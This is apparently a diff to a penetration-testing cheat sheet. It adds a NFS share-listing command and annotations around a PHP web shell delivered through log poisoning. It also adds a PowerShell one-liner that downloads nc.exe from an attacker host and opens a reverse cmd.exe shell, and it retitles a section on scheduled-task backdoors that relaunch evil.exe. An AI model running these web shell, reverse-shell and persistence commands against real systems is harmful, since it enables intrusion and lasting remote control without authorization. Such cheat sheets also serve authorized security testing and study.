@@ -30,6 +30,11 @@ telnet $TARGET 80
 curl -vX $TARGET
 ```
 
+#### NFS Exported Shares
+```bash
+showmount -e 192.168.110.102
+```
+
 #### Kerberos User Enumeration
 ```bash
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
@@ -149,7 +154,11 @@ gcc -m32|-m64 -o output source.c
 ```php
 # Vulnerable web app on Windows + PHP through contaminated logs
 nc $WINDOWSTARGET 80
+
+# Send as HTTP request
 <?php system($_GET['cmd']);?>
+
+# Send as cmd=
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 ```
 #### Remote File InclusionShell: Windows + PHP
@@ -355,7 +364,7 @@ find /etc -iname *.conf
 ```
 
 ## Maintaining Access
-#### Persisten BackDoors
+#### Persistent Back Doors
 ```
 # Launch evil.exe every 10 minutes
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
